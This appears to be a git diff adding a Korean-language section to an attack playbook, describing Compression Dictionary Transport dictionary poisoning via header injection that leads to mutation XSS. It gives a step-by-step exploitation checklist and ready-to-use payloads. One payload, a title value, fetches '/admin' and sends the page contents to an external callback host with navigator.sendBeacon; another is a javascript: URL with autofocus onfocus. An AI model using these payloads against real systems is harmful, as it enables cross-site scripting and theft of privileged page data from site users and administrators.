@@ -29,6 +29,27 @@ description: >
 time.sleep(8)
 ```
 
+### Compression Dictionary Transport (CDT) 오염 -> mXSS
+
+`Use-As-Dictionary`의 `id=`가 user-controlled title/path로 조립되면 structured-header injection을 먼저 본다.
+서버가 `Dictionary-ID` 존재만 확인하고 실제 `Available-Dictionary` hash/body를 검증하지 않으면,
+브라우저는 공격자 응답을 딕셔너리로 저장하고 서버는 다른 문서를 기준으로 압축하게 만들 수 있다.
+
+실전 체크리스트:
+- victim dictionary 문서를 한 번 직접 요청해서 서버 쪽 캐시를 먼저 워밍한다.
+- 브라우저가 재사용할 match scope는 공격자 문서 경로(`/doc/<same-id>/*`)에 남기고, `id=`만 victim dictionary id로 바꾼다.
+- 두 번째 응답은 길고 복잡한 핸들러보다 `javascript:` URL + `autofocus onfocus=location=href//` 형태가 안정적이다.
+- 외부 콜백은 `navigator.sendBeacon('//callback', body)`가 짧고 `no-cors` 제약에서도 잘 동작한다.
+
+짧은 형태:
+```markdown
+[x](java "autofocus onfocus=location=href//")
+```
+
+```text
+title = script:(async()=>navigator.sendBeacon('//callback',await(await fetch('/admin')).text()))()//
+```
+
 ### Stored XSS -> ChromeDriver Loopback RCE
 
 Selenium 기반 bot이 `chromedriver --port=<ephemeral>`를 같은 컨테이너의 loopback에 띄운 상태라면,
